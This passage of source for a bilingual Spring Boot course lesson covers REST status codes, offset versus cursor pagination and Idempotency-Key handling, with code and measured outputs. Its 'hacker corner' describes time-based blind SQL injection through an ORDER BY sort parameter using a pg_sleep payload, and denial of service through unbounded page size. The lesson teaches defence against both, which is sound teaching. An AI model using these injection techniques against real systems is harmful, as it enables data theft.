const MA45_IDEM = java("@RestController\npublic class BookingCommandController {\n    private final JdbcClient db;\n\n    BookingCommandController(JdbcClient db) { this.db = db; }\n\n    public record BookingRequest(String labCode, String student, Instant startAt) {}\n\n    @PostMapping(\"/bookings\")\n    public ResponseEntity<String> create(@RequestHeader(value = \"Idempotency-Key\", required = false) String key,\n                                         @RequestBody String rawBody) throws Exception {\n        if (key == null) return ResponseEntity.status(201).body(insert(rawBody));   // không có khoá: mỗi lần gửi = một lượt mới\n\n        String hash = HexFormat.of().formatHex(MessageDigest.getInstance(\"SHA-256\").digest(rawBody.getBytes()));\n        // 1) Giành khoá. PRIMARY KEY(key) bảo đảm chỉ MỘT request thắng, kể cả khi 10 request tới cùng lúc.\n        int won = db.sql(\"INSERT INTO idempotency_keys(key, request_hash) VALUES (?, ?) ON CONFLICT DO NOTHING\")\n                .params(key, hash).update();\n        if (won == 0) {\n            var saved = db.sql(\"SELECT request_hash, status_code, body FROM idempotency_keys WHERE key = ?\")\n                    .param(key).query((rs, i) -> new Object[]{rs.getString(1), rs.getObject(2), rs.getString(3)}).single();\n            if (!hash.equals(saved[0]))\n                return ResponseEntity.unprocessableContent().body(\"{\\\"error\\\":\\\"Idempotency-Key reused with a different body\\\"}\");\n            if (saved[1] == null)\n                return ResponseEntity.status(409).body(\"{\\\"error\\\":\\\"request with this key is still in progress\\\"}\");\n            return ResponseEntity.status((Integer) saved[1]).header(\"Idempotent-Replayed\", \"true\").body((String) saved[2]);\n        }\n        // 2) Làm việc thật, 3) lưu kết quả để lần sau trả lại y hệt.\n        try {\n            String body = insert(rawBody);\n            db.sql(\"UPDATE idempotency_keys SET status_code = 201, body = ? WHERE key = ?\").params(body, key).update();\n            return ResponseEntity.status(201).body(body);\n        } catch (RuntimeException e) {\n            db.sql(\"DELETE FROM idempotency_keys WHERE key = ?\").param(key).update();  // lỗi ⇒ nhả khoá cho phép thử lại\n            throw e;\n        }\n    }");
const SQL45_IDEM = sql("CREATE TABLE idempotency_keys (key text PRIMARY KEY, request_hash text NOT NULL, status_code int, body text,\n                               created_at timestamptz NOT NULL DEFAULT now());");
const OUT45_IDEM = out("# 1) KHÔNG có khoá: client hết giờ chờ (0,1 s) rồi gửi lại\n$ curl --max-time 0.1 -X POST localhost:8080/bookings -H 'Content-Type: application/json' -d '{\"labCode\":\"AI-01\",\"student\":\"an\",\"startAt\":\"2026-11-20T08:00:00+07:00\"}'\ncurl: (28) Operation timed out after 100 milliseconds\n$ curl -X POST localhost:8080/bookings -H 'Content-Type: application/json' -d '{\"labCode\":\"AI-01\",\"student\":\"an\",\"startAt\":\"2026-11-20T08:00:00+07:00\"}'      # gửi lại\nHTTP/1.1 201 \n{\"id\":1000002,\"labCode\":\"AI-01\",\"student\":\"an\"}\n$ psql -c \"SELECT count(*) FROM bookings WHERE student='an'\"\n2\n\n# 2) CÓ khoá: cùng tình huống\n$ curl --max-time 0.1 -X POST localhost:8080/bookings -H 'Idempotency-Key: 7f3c-an-0800' -H 'Content-Type: application/json' -d '{\"labCode\":\"AI-01\",\"student\":\"an\",\"startAt\":\"2026-11-20T08:00:00+07:00\"}'\ncurl: (28) Operation timed out after 100 milliseconds\n$ curl -i -X POST localhost:8080/bookings -H 'Idempotency-Key: 7f3c-an-0800' -H 'Content-Type: application/json' -d '{\"labCode\":\"AI-01\",\"student\":\"an\",\"startAt\":\"2026-11-20T08:00:00+07:00\"}'      # gửi lại\nHTTP/1.1 201 \nIdempotent-Replayed: true\n{\"id\":1000003,\"labCode\":\"AI-01\",\"student\":\"an\"}\n$ psql -c \"SELECT count(*) FROM bookings WHERE student='an'\"\n1\n\n# 3) cùng khoá, body khác\n$ curl -i -X POST localhost:8080/bookings -H 'Idempotency-Key: 7f3c-an-0800' -H 'Content-Type: application/json' -d '{\"labCode\":\"AI-01\",\"student\":\"an\",\"startAt\":\"2026-11-20T10:00:00+07:00\"}'\nHTTP/1.1 422 \n{\"error\":\"Idempotency-Key reused with a different body\"}");
const OUT45_RACE = out("# 4) 10 request CÙNG khoá bắn cùng lúc (bấm \"Đặt\" liên tục + app tự thử lại)\n$ for i in $(seq 10); do curl -s -o /dev/null -w '%{http_code}\\n' -X POST localhost:8080/bookings -H 'Idempotency-Key: k-binh-21' -H 'Content-Type: application/json' -d '{\"labCode\":\"IOT-02\",\"student\":\"binh\",\"startAt\":\"2026-11-21T08:00:00+07:00\"}' & done; wait\n  1 201\n  9 409\n$ psql -c \"SELECT count(*) FROM bookings WHERE student='binh'\"\n1\n# cùng thí nghiệm, KHÔNG có khoá (bỏ -H 'Idempotency-Key: …')\n  10 201\n$ psql -c \"SELECT count(*) FROM bookings WHERE student='binh'\"\n10");
const MA45_GIAI = java("/** Lời giải thực hành 4.5: phân trang keyset theo (start_at, id) — con trỏ mờ (opaque) bằng Base64. */\n@RestController\npublic class TimelineController {\n    private final JdbcClient db;\n\n    TimelineController(JdbcClient db) { this.db = db; }\n\n    public record BookingView(long id, String labCode, String student, Instant startAt) {}\n    public record Slice(List<BookingView> items, String nextCursor) {}\n\n    @GetMapping(\"/bookings/timeline\")\n    public Slice timeline(@RequestParam(required = false) String cursor, @RequestParam(defaultValue = \"20\") int size) {\n        size = Math.clamp(size, 1, 100);\n        Instant afterTime = Instant.EPOCH;\n        long afterId = 0;\n        if (cursor != null) {                                          // \"2026-01-05T02:00:00Z|4\" ⇒ (thời điểm, id)\n            String[] p = new String(Base64.getUrlDecoder().decode(cursor), StandardCharsets.UTF_8).split(\"\\\\|\");\n            afterTime = Instant.parse(p[0]);\n            afterId = Long.parseLong(p[1]);\n        }\n        List<BookingView> items = db.sql(\"\"\"\n                SELECT id, lab_code, student, start_at FROM bookings\n                WHERE (start_at, id) > (?, ?)                               -- so sánh theo bộ: thời điểm trước, id phá hoà\n                ORDER BY start_at, id LIMIT ?\"\"\")\n                .params(Timestamp.from(afterTime), afterId, size).query(BookingView.class).list();\n        String next = null;\n        if (items.size() == size) {\n            BookingView last = items.getLast();\n            next = Base64.getUrlEncoder().withoutPadding()\n                    .encodeToString((last.startAt() + \"|\" + last.id()).getBytes(StandardCharsets.UTF_8));\n        }\n        return new Slice(items, next);\n    }\n}");
const OUT45_GIAI = out("$ curl 'localhost:8080/bookings/timeline?size=3'\n{\"items\":[{\"id\":20000,\"labCode\":\"NET-03\",\"student\":\"sv0000\",\"startAt\":\"2026-01-05T00:00:00Z\"},{\"id\":40000,\"labCode\":\"IOT-02\",\"student\":\"sv0000\",\"startAt\":\"2026-01-05T00:00:00Z\"},{\"id\":60000,\"labCode\":\"AI-01\",\"student\":\"sv0000\",\"startAt\":\"2026-01-05T00:00:00Z\"}],\"nextCursor\":\"MjAyNi0wMS0wNVQwMDowMDowMFp8NjAwMDA\"}\n$ curl 'localhost:8080/bookings/timeline?size=3&cursor=MjAyNi0wMS0wNVQwMDowMDowMFp8NjAwMDA'\n{\"items\":[{\"id\":80000,\"labCode\":\"NET-03\",\"student\":\"sv0000\",\"startAt\":\"2026-01-05T00:00:00Z\"},{\"id\":100000,\"labCode\":\"IOT-02\",\"student\":\"sv0000\",\"startAt\":\"2026-01-05T00:00:00Z\"},{\"id\":120000,\"labCode\":\"AI-01\",\"student\":\"sv0000\",\"startAt\":\"2026-01-05T00:00:00Z\"}],\"nextCursor\":\"MjAyNi0wMS0wNVQwMDowMDowMFp8MTIwMDAw\"}\n$ echo MjAyNi0wMS0wNVQwMDowMDowMFp8NjAwMDA | base64 -d\n2026-01-05T00:00:00Z|60000\n$ curl -s -o /dev/null -w '%{time_total}s\\n' 'localhost:8080/bookings/timeline?size=100&cursor=…'   # con trỏ ở gần cuối 1 000 000 dòng\n0.016749s\n0.023285s\n0.019307s");

const L45_EN = `
<div class="ml-en">
<span class="eyebrow">Chapter 4 · Lesson 4.5</span>
<h2>REST design: status codes, pagination, idempotency</h2>
<p class="lead">Lesson 4.1 made endpoints that work. This lesson makes them behave the way a front-end developer, a mobile app on a bad network and an attacker will expect. On PostgreSQL with one million bookings we measure: <code>201</code> with an absolute <code>Location</code>, <code>204</code>, <code>409</code> from a unique constraint; a page of 100 that costs 3&nbsp;ms or 7&nbsp;seconds depending on one line of code; deep pages with <code>OFFSET</code> versus a cursor (132&nbsp;ms vs 0.045&nbsp;ms in PostgreSQL); a <code>sort</code> parameter that leaks the database user name one letter at a time; and the <code>Idempotency-Key</code> header that turns "the client retried" from two bookings into one — even with ten requests in flight at the same time.</p>
<p>The API &amp; System Design course covers these ideas in depth on Node.js (Chapters 1, 3 and 5). Here we build them the Spring way and add the numbers.</p>

<h3>In everyday life first</h3>
<p>You order a coffee in an app, the screen spins, the connection drops. Did the order go through? If you tap "Order" again and get two coffees, the app was not idempotent. A good café app sends the same order number both times; the shop sees the number it already has and answers "yes, that order is already being made". In HTTP that order number is the <strong>Idempotency-Key</strong>. Pagination is the café's menu book: nobody prints all 500 items on one page, and if the menu has a hundred pages you jump with the index (a cursor), you do not count pages one by one (an offset).</p>

<h3>Status codes that mean what they say</h3>
${MA45_LAB}
${OUT45_CRUD}
<div class="kv-grid">
  <div class="kv"><span class="k">201 + Location</span><span class="v"><code>ServletUriComponentsBuilder.fromCurrentRequest()</code> builds an absolute URL from the actual request (scheme, host, port, path) — correct behind a different port, and behind a reverse proxy once forwarded headers are configured. The client can follow it without knowing your URL scheme.</span></div>
  <div class="kv"><span class="k">409 Conflict</span><span class="v">The request is valid, but conflicts with the current state: the code <code>SEC-04</code> exists. PostgreSQL's <code>UNIQUE</code> constraint decides; Spring translates the SQL error into <code>DuplicateKeyException</code> (the <code>@Repository</code>-style exception translation of lesson 3.3), and the handler maps it to 409. Checking "does it exist?" with a SELECT before inserting is a race: two requests can both see "no".</span></div>
  <div class="kv"><span class="k">204 / 404</span><span class="v">Delete succeeded with nothing to return; the second delete finds nothing.</span></div>
  <div class="kv"><span class="k">ResponseEntity.of(optional)</span><span class="v">200 with the body if present, 404 if empty — one line for the most common read.</span></div>
</div>
<p>Two codes people confuse: <strong>400</strong> (the request itself is malformed or invalid — Chapter 5) vs <strong>422</strong> (well-formed, but cannot be processed as sent; we use it below for an idempotency key reused with a different body), and <strong>401</strong> (who are you? not logged in) vs <strong>403</strong> (I know who you are, and the answer is no) — Chapter 9.</p>

<h3>Pagination: the data</h3>
${SQL45_SCHEMA}
<p>One million bookings, 50 of them at every half-hour slot — many rows share the same <code>start_at</code>, which matters for sorting.</p>

<h3>Offset pagination, done carefully</h3>
${MA45_QUERY}
${OUT45_PAGE}
<ul>
  <li><strong>The envelope</strong> (<code>items</code>, <code>page</code>, <code>size</code>, <code>totalItems</code>, <code>totalPages</code>) lets a UI draw "page 1 of 333 334". Spring Data's <code>Page</code> (Chapter 6) produces the same thing from a repository.</li>
  <li><strong><code>Math.clamp(size, 1, 100)</code>:</strong> <code>size=1000000</code> answered with 100 items. Never let the client choose how much work your server does.</li>
  <li><strong>A tie-breaker:</strong> <code>ORDER BY start_at DESC, id DESC</code>. With 50 rows per <code>start_at</code>, sorting by time alone gives an order PostgreSQL may change between queries — the same booking appears on page 1 and page 2, another never appears.</li>
  <li><strong>Sorting by a whitelist:</strong> <code>ORDER BY</code> cannot take a <code>?</code> parameter, so the column name must come from your own map, never from the request (<code>sort=student</code> ⇒ 400). The hacker corner shows why.</li>
</ul>

<h3>Offset vs cursor on deep pages</h3>
${OUT45_KEYSET}
${OUT45_DEEP}
${OUT45_EXPLAIN}
<p><code>OFFSET 999900</code> means "produce 1&nbsp;000&nbsp;000 rows in order, throw away the first 999&nbsp;900": the index scan reads all of them (<code>rows=1000000</code>) — 132&nbsp;ms, and it grows with the page number. The keyset query <code>WHERE id &gt; 999900</code> jumps into the index and reads exactly 100 rows: 0.045&nbsp;ms, whatever the depth. Through HTTP the difference is ~0.1&nbsp;s vs ~0.005&nbsp;s per page; under load, deep offsets are what kill a database. The page also pays for <code>count(*)</code> (37&nbsp;ms here) on every request — many APIs drop the total, or cache it.</p>
<div class="kv-grid">
  <div class="kv"><span class="k">Offset (page/size)</span><span class="v">Jump to page N, show total pages. Slow on deep pages; rows inserted while browsing shift pages (duplicates/gaps). Fine for admin tables.</span></div>
  <div class="kv"><span class="k">Keyset / cursor</span><span class="v">Constant speed, stable under inserts; only "next page", no "jump to page 4000". Right for feeds, infinite scroll, sync, exports.</span></div>
</div>

<h3>🕵️ Hacker corner — unbounded size and ORDER BY injection</h3>
<p>The naive version of the same endpoint, written the way it often is:</p>
${MA45_NAIVE}
${OUT45_SIZE}
<p>One request with <code>size=1000000</code>: 84.5&nbsp;MB of JSON and 6.5–7.7&nbsp;s of database, CPU and heap — repeat it from a few clients and the API is down. The bounded version answered 8&nbsp;KB in 30&nbsp;ms.</p>
${OUT45_INJECT}
<p>The second problem is worse. <code>sort</code> is concatenated into <code>ORDER BY</code>, so any SQL expression is accepted. <code>(SELECT 1 FROM pg_sleep(3))</code> makes the response take exactly 3 seconds — proof of injection. Then a <code>CASE WHEN</code> asks a yes/no question about data: "does the database user start with <code>p</code>?" — 3&nbsp;s means yes, 0.003&nbsp;s means no. Repeat per letter and the attacker reads <code>postgres</code>, then table names, then any column — <strong>time-based blind SQL injection</strong>, through a parameter that "only sorts". Prepared statements do not help here because identifiers cannot be parameters; only a whitelist does. The same request against the whitelisted endpoint: 400, no SQL executed.</p>
<div class="callout warn"><p><strong>Real incident — Optus, Australia, 2022.</strong> Optus disclosed on 22 September 2022 that personal data of millions of current and former customers had been stolen; according to the Australian Information Commissioner's 2025 court filing (reported by iTnews, 8 August 2025) about 9.5 million Australians were affected, and the attacker "abused an unauthenticated, internet-facing API". An API that answers anyone, with no limit on how many records it returns or how fast, is a database export with extra steps.</p>
<p><strong>How to prevent it:</strong> authentication on every non-public endpoint (Chapter 9); cap page size; rate-limit per client (Chapter 10); whitelist sort fields; non-guessable public IDs or object-level authorisation so iterating IDs gets nothing (Chapter 10, IDOR); monitor unusual volumes.</p></div>

<h3>Idempotency-Key: retrying a POST safely</h3>
<p>GET, PUT and DELETE can be retried; POST cannot — unless the client sends a key that identifies <em>this intention</em>. The server stores the first result under that key and replays it for every retry:</p>
${SQL45_IDEM}
${MA45_IDEM}
<ol>
  <li><strong>Claim the key</strong> with <code>INSERT … ON CONFLICT DO NOTHING</code>. The primary key guarantees that exactly one request wins, even when several arrive at the same millisecond — no Java lock, no race between a SELECT and an INSERT.</li>
  <li>The loser looks at the stored row: different body hash ⇒ <strong>422</strong> (the client reused a key for a different booking — a client bug); no result yet ⇒ <strong>409</strong> "still in progress"; result present ⇒ replay the same status and body with <code>Idempotent-Replayed: true</code>.</li>
  <li>The winner does the work, stores the result; on failure it deletes the key so the client may retry.</li>
</ol>
${OUT45_IDEM}
<p>The client gave up after 100&nbsp;ms, but the server had already received the request and finished it 200&nbsp;ms later. Without a key the retry created a <strong>second booking</strong>. With a key the retry returned the first booking (<code>1000003</code>), marked as replayed — one row. Reusing the key with another start time is refused.</p>
${OUT45_RACE}
<p>Ten simultaneous requests with the same key: one 201, nine 409 (they arrived while the first was still working, and should retry later to get the replay), one row in the table. Without a key: ten rows — exactly the double-tap on a slow phone. In production you also expire old keys (for example after 24 hours) and scope them to the user, so one user cannot read another's replay.</p>

<h3>Compared with Node.js</h3>
<p>The API &amp; System Design course builds the same Idempotency-Key as one Express middleware (lesson 5.1) and offset/cursor pagination with the same PostgreSQL measurements (Chapter 3). The mechanisms are identical — the database does the hard part (a primary key for the race, an index for the cursor). The framework differences: Spring gives you typed <code>@RequestParam int size</code> (garbage ⇒ 400 for free), Express gives you strings to validate; Spring's <code>DuplicateKeyException</code> hides the PostgreSQL error code that Node code checks by hand (<code>err.code === '23505'</code>).</p>

<h3>In real life and at work</h3>
<ul>
  <li><strong>Payment APIs</strong> such as Stripe accept an <code>Idempotency-Key</code> header on create operations for exactly this reason — retries on mobile networks are normal, not exceptional. Design your booking API the same way.</li>
  <li><strong>"The admin table is slow on the last page"</strong>: that is <code>OFFSET</code>. Switch the export and the infinite-scroll views to a cursor; keep page numbers only where humans click page numbers.</li>
  <li><strong>Code review red flags:</strong> any <code>+ sort +</code>, <code>+ order +</code> or <code>+ size</code> inside a SQL string; an endpoint returning a list with no limit; <code>if (!exists) insert</code> to enforce uniqueness.</li>
</ul>

<h3>🎤 What the interviewer will ask</h3>
<ol>
  <li><strong>"What should a POST that creates a resource return?"</strong> — 201 Created, a <code>Location</code> header with the new resource's URL, usually the created representation in the body.</li>
  <li><strong>"Offset vs cursor pagination?"</strong> — Offset: random access and totals, but cost grows with depth and pages shift on inserts. Cursor/keyset: <code>WHERE (key) &gt; last</code> on an index, constant cost, stable, but only next/previous. Always add a unique tie-breaker to the sort.</li>
  <li><strong>"How do you make POST idempotent?"</strong> — Client sends an <code>Idempotency-Key</code>; server atomically claims it (unique constraint), stores the response, replays it on retries, rejects reuse with a different body, expires keys.</li>
  <li><strong>"Can you use a prepared statement parameter for ORDER BY?"</strong> — No, identifiers cannot be bound; map user input to a whitelist of known columns.</li>
  <li><strong>"409 vs 422 vs 400?"</strong> — 400 malformed/invalid request; 422 well-formed but semantically unprocessable; 409 conflicts with current state (duplicate, version mismatch).</li>
</ol>

<h3>🧪 Practice (25 minutes)</h3>
<div class="callout ok"><ol>
  <li>Add <code>GET /bookings/timeline?cursor=…&amp;size=…</code>: bookings in order of <code>start_at</code>, using keyset pagination.</li>
  <li>Many bookings share the same <code>start_at</code> — no booking may be skipped or repeated between pages.</li>
  <li>The cursor must be opaque to the client (they must not build it themselves).</li>
</ol>
<p><strong>Done when:</strong> following <code>nextCursor</code> gives consecutive pages without duplicates, and a cursor near the end of the million rows still answers in a few milliseconds.</p></div>
${giai('Show one solution', `${MA45_GIAI}
${OUT45_GIAI}
<p>The cursor is the pair <em>(start_at, id)</em> of the last row; PostgreSQL compares row values <code>(start_at, id) &gt; (?, ?)</code> lexicographically, so rows with the same time are ordered by id and none is lost. Base64 makes the cursor opaque — you can change its content later without breaking clients. Add an index on <code>(start_at, id)</code> (the schema has one) so the query is a single index range scan.</p>`)}

<h3>🗂 Key terms</h3>
<div class="kv-grid">
  <div class="kv"><span class="k">Location header</span><span class="v">Where a newly created resource lives; sent with 201.</span></div>
  <div class="kv"><span class="k">Offset pagination</span><span class="v"><code>LIMIT n OFFSET k</code>; random access, cost grows with k.</span></div>
  <div class="kv"><span class="k">Keyset / cursor pagination</span><span class="v"><code>WHERE key &gt; last ORDER BY key LIMIT n</code>; constant cost, next-page only.</span></div>
  <div class="kv"><span class="k">Tie-breaker</span><span class="v">A unique column added to the sort so the order is total and stable.</span></div>
  <div class="kv"><span class="k">Idempotency-Key</span><span class="v">Client-chosen key that lets the server recognise and replay a retried non-idempotent request.</span></div>
  <div class="kv"><span class="k">Blind SQL injection</span><span class="v">Extracting data through yes/no side effects (timing) instead of visible output.</span></div>
</div>

<h3>📌 Summary</h3>
<ul>
  <li>201 + absolute Location, 204, 404, 409 from database constraints — let PostgreSQL arbitrate races.</li>
  <li>Cap page size, whitelist sort fields, add a tie-breaker; use a cursor for deep or infinite lists (132&nbsp;ms vs 0.045&nbsp;ms).</li>
  <li>A sort parameter concatenated into SQL is a full blind injection; an unbounded size is a denial of service.</li>
  <li>Idempotency-Key + a primary key made 10 parallel retries create exactly one booking.</li>
</ul>

<h3>📚 Go deeper</h3>
${tl('https://www.rfc-editor.org/rfc/rfc9110#name-status-codes', '📜', 'RFC 9110 — HTTP status codes', 'The definitions behind 201, 204, 400, 404, 405, 406, 409, 415, 422.')}
${tl('https://use-the-index-luke.com/no-offset', '🐘', 'Use The Index, Luke — No offset', 'Why OFFSET is slow and how keyset pagination works with row values.')}

<h3>Sources</h3>
<ul>
  <li>Outputs above: RestApp and GiaiApp on Spring Boot 4.1.2 with PostgreSQL 16, 1 000 000 generated bookings, Temurin 21.0.12.1 (19/11/2026).</li>
  <li>iTnews, "Optus to answer privacy court case stemming from 2022 data breach" (08/08/2025): <a href="https://www.itnews.com.au/news/optus-to-answer-privacy-court-case-stemming-from-2022-data-breach-619417" target="_blank" rel="noopener">itnews.com.au</a>; OAIC civil penalty proceedings against Optus (9.5 million Australians).</li>
</ul>
</div>
`;

const L45_VI = `
<div class="ml-vi">
<span class="eyebrow">Chương 4 · Bài 4.5</span>
<h2>Thiết kế REST: mã trạng thái, phân trang, idempotency</h2>
<p class="lead">Bài 4.1 làm ra những endpoint chạy được. Bài này làm cho chúng cư xử đúng như một lập trình viên frontend, một ứng dụng di động trên mạng chập chờn và một kẻ tấn công sẽ mong đợi. Trên PostgreSQL với một triệu lượt đặt, ta đo: <code>201</code> kèm <code>Location</code> tuyệt đối, <code>204</code>, <code>409</code> từ ràng buộc unique; một trang 100 dòng tốn 3&nbsp;ms hay 7&nbsp;giây tuỳ một dòng mã; trang sâu bằng <code>OFFSET</code> so với con trỏ (132&nbsp;ms so với 0,045&nbsp;ms trong PostgreSQL); một tham số <code>sort</code> làm lộ tên người dùng cơ sở dữ liệu từng chữ một; và header <code>Idempotency-Key</code> biến "client thử lại" từ hai lượt đặt thành một — kể cả khi mười request bay tới cùng lúc.</p>
<p>Khoá API &amp; System Design dạy sâu các ý này trên Node.js (Chương 1, 3 và 5). Ở đây ta dựng chúng theo cách Spring và thêm số đo.</p>

<h3>Đời thường trước đã</h3>
<p>Bạn gọi một ly cà phê trên ứng dụng, màn hình quay mãi, mạng rớt. Đơn đã đi chưa? Nếu bạn bấm "Đặt" lần nữa và nhận hai ly, ứng dụng đó không idempotent. Một ứng dụng quán tử tế gửi cùng một số đơn cả hai lần; quán thấy số đơn đã có và trả lời "rồi, đơn đó đang pha". Trong HTTP, số đơn đó là <strong>Idempotency-Key</strong>. Phân trang là cuốn thực đơn: không ai in cả 500 món lên một trang, và nếu thực đơn dày một trăm trang thì bạn lật theo mục lục (con trỏ), không đếm từng trang (offset).</p>

<h3>Mã trạng thái đúng nghĩa</h3>
${MA45_LAB}
${OUT45_CRUD}
<div class="kv-grid">
  <div class="kv"><span class="k">201 + Location</span><span class="v"><code>ServletUriComponentsBuilder.fromCurrentRequest()</code> dựng URL tuyệt đối từ chính request (giao thức, host, cổng, đường dẫn) — đúng cả khi chạy cổng khác, và sau reverse proxy khi đã cấu hình header chuyển tiếp. Client đi theo được mà không cần biết cách bạn đặt URL.</span></div>
  <div class="kv"><span class="k">409 Conflict</span><span class="v">Request hợp lệ, nhưng xung đột với trạng thái hiện tại: mã <code>SEC-04</code> đã có. Ràng buộc <code>UNIQUE</code> của PostgreSQL quyết định; Spring dịch lỗi SQL thành <code>DuplicateKeyException</code> (kiểu dịch exception của <code>@Repository</code> ở bài 3.3), và handler đổi nó thành 409. Kiểm "đã có chưa?" bằng SELECT trước khi INSERT là một cuộc đua: hai request có thể cùng thấy "chưa".</span></div>
  <div class="kv"><span class="k">204 / 404</span><span class="v">Xoá thành công, không có gì trả về; lần xoá thứ hai không tìm thấy gì.</span></div>
  <div class="kv"><span class="k">ResponseEntity.of(optional)</span><span class="v">Có thì 200 kèm body, rỗng thì 404 — một dòng cho kiểu đọc phổ biến nhất.</span></div>
</div>
<p>Hai cặp mã hay bị nhầm: <strong>400</strong> (bản thân request sai định dạng hoặc không hợp lệ — Chương 5) và <strong>422</strong> (đúng định dạng, nhưng không xử lý được như đã gửi; bên dưới ta dùng nó cho khoá idempotency bị dùng lại với body khác); <strong>401</strong> (bạn là ai? chưa đăng nhập) và <strong>403</strong> (tôi biết bạn là ai, và câu trả lời là không) — Chương 9.</p>

<h3>Phân trang: dữ liệu</h3>
${SQL45_SCHEMA}
<p>Một triệu lượt đặt, mỗi khung nửa tiếng có 50 lượt — nhiều dòng trùng <code>start_at</code>, điều này quan trọng khi sắp xếp.</p>

<h3>Phân trang offset, làm cẩn thận</h3>
${MA45_QUERY}
${OUT45_PAGE}
<ul>
  <li><strong>Phong bì</strong> (<code>items</code>, <code>page</code>, <code>size</code>, <code>totalItems</code>, <code>totalPages</code>) cho giao diện vẽ được "trang 1 trên 333 334". <code>Page</code> của Spring Data (Chương 6) sinh đúng thứ này từ repository.</li>
  <li><strong><code>Math.clamp(size, 1, 100)</code>:</strong> <code>size=1000000</code> được trả 100 phần tử. Đừng bao giờ để client chọn server của bạn làm bao nhiêu việc.</li>
  <li><strong>Cột phá hoà:</strong> <code>ORDER BY start_at DESC, id DESC</code>. Với 50 dòng mỗi <code>start_at</code>, chỉ sắp theo giờ cho ra một thứ tự PostgreSQL có thể đổi giữa các lần truy vấn — cùng một lượt đặt hiện ở trang 1 và trang 2, lượt khác thì không bao giờ hiện.</li>
  <li><strong>Sắp xếp theo danh sách trắng:</strong> <code>ORDER BY</code> không nhận tham số <code>?</code>, nên tên cột phải lấy từ bảng tra của chính bạn, không bao giờ lấy từ request (<code>sort=student</code> ⇒ 400). Góc hacker cho thấy vì sao.</li>
</ul>

<h3>Offset so với con trỏ ở trang sâu</h3>
${OUT45_KEYSET}
${OUT45_DEEP}
${OUT45_EXPLAIN}
<p><code>OFFSET 999900</code> nghĩa là "sinh ra 1&nbsp;000&nbsp;000 dòng theo thứ tự, vứt 999&nbsp;900 dòng đầu": lần quét chỉ mục đọc hết (<code>rows=1000000</code>) — 132&nbsp;ms, và tăng theo số trang. Truy vấn keyset <code>WHERE id &gt; 999900</code> nhảy thẳng vào chỉ mục và đọc đúng 100 dòng: 0,045&nbsp;ms, sâu bao nhiêu cũng vậy. Qua HTTP, chênh lệch là khoảng 0,1&nbsp;s so với 0,005&nbsp;s mỗi trang; khi tải cao, offset sâu chính là thứ giết cơ sở dữ liệu. Mỗi trang còn trả giá cho <code>count(*)</code> (ở đây 37&nbsp;ms) ở mọi request — nhiều API bỏ tổng, hoặc lưu đệm nó.</p>
<div class="kv-grid">
  <div class="kv"><span class="k">Offset (page/size)</span><span class="v">Nhảy tới trang N, hiện tổng số trang. Chậm ở trang sâu; dòng được thêm trong lúc xem làm trang bị xô (trùng/sót). Ổn cho bảng quản trị.</span></div>
  <div class="kv"><span class="k">Keyset / con trỏ</span><span class="v">Tốc độ không đổi, ổn định khi có dòng mới; chỉ có "trang tiếp", không có "nhảy tới trang 4000". Đúng cho feed, cuộn vô hạn, đồng bộ, xuất dữ liệu.</span></div>
</div>

<h3>🕵️ Góc hacker — size không giới hạn và chèn SQL vào ORDER BY</h3>
<p>Bản ngây thơ của cùng endpoint đó, viết theo cách người ta vẫn hay viết:</p>
${MA45_NAIVE}
${OUT45_SIZE}
<p>Một request với <code>size=1000000</code>: 84,5&nbsp;MB JSON và 6,5–7,7&nbsp;giây cơ sở dữ liệu, CPU, heap — lặp lại từ vài client là API sập. Bản có giới hạn trả 8&nbsp;KB trong 30&nbsp;ms.</p>
${OUT45_INJECT}
<p>Vấn đề thứ hai còn tệ hơn. <code>sort</code> bị nối vào <code>ORDER BY</code>, nên biểu thức SQL nào cũng được nhận. <code>(SELECT 1 FROM pg_sleep(3))</code> làm response mất đúng 3 giây — bằng chứng có chèn được. Rồi một <code>CASE WHEN</code> đặt câu hỏi có/không về dữ liệu: "tên người dùng cơ sở dữ liệu có bắt đầu bằng <code>p</code> không?" — 3&nbsp;s là có, 0,003&nbsp;s là không. Lặp từng chữ là kẻ tấn công đọc ra <code>postgres</code>, rồi tên bảng, rồi bất kỳ cột nào — <strong>chèn SQL mù dựa trên thời gian</strong>, qua một tham số "chỉ để sắp xếp". Prepared statement không cứu được ở đây vì tên cột không làm tham số được; chỉ danh sách trắng cứu được. Cùng request đó vào endpoint có danh sách trắng: 400, không câu SQL nào chạy.</p>
<div class="callout warn"><p><strong>Sự cố thật — Optus, Úc, 2022.</strong> Ngày 22/9/2022 Optus công bố dữ liệu cá nhân của hàng triệu khách hàng cũ và hiện tại đã bị đánh cắp; theo hồ sơ khởi kiện năm 2025 của Uỷ viên Thông tin Úc (iTnews đưa tin ngày 8/8/2025), khoảng 9,5 triệu người Úc bị ảnh hưởng, và kẻ tấn công đã "abused an unauthenticated, internet-facing API" (lạm dụng một API công khai trên internet không cần xác thực). Một API trả lời bất kỳ ai, không giới hạn trả bao nhiêu bản ghi hay nhanh tới đâu, chính là một nút xuất cơ sở dữ liệu đi đường vòng.</p>
<p><strong>Cách phòng:</strong> xác thực ở mọi endpoint không công khai (Chương 9); giới hạn cỡ trang; giới hạn tần suất theo từng client (Chương 10); danh sách trắng cho trường sắp xếp; id công khai khó đoán hoặc phân quyền theo đối tượng để duyệt id không lấy được gì (Chương 10, IDOR); giám sát lưu lượng bất thường.</p></div>

<h3>Idempotency-Key: thử lại POST an toàn</h3>
<p>GET, PUT, DELETE thử lại được; POST thì không — trừ khi client gửi một khoá định danh <em>đúng ý định này</em>. Server lưu kết quả đầu tiên dưới khoá đó và trả lại nguyên văn cho mọi lần thử lại:</p>
${SQL45_IDEM}
${MA45_IDEM}
<ol>
  <li><strong>Giành khoá</strong> bằng <code>INSERT … ON CONFLICT DO NOTHING</code>. Khoá chính bảo đảm đúng một request thắng, kể cả khi nhiều request tới trong cùng một mili giây — không cần khoá Java, không có cuộc đua giữa SELECT và INSERT.</li>
  <li>Request thua xem hàng đã lưu: hash body khác ⇒ <strong>422</strong> (client dùng lại khoá cho một lượt đặt khác — lỗi phía client); chưa có kết quả ⇒ <strong>409</strong> "đang xử lý"; đã có kết quả ⇒ trả lại cùng mã trạng thái và body kèm <code>Idempotent-Replayed: true</code>.</li>
  <li>Request thắng làm việc thật, lưu kết quả; nếu lỗi thì xoá khoá để client được thử lại.</li>
</ol>
${OUT45_IDEM}
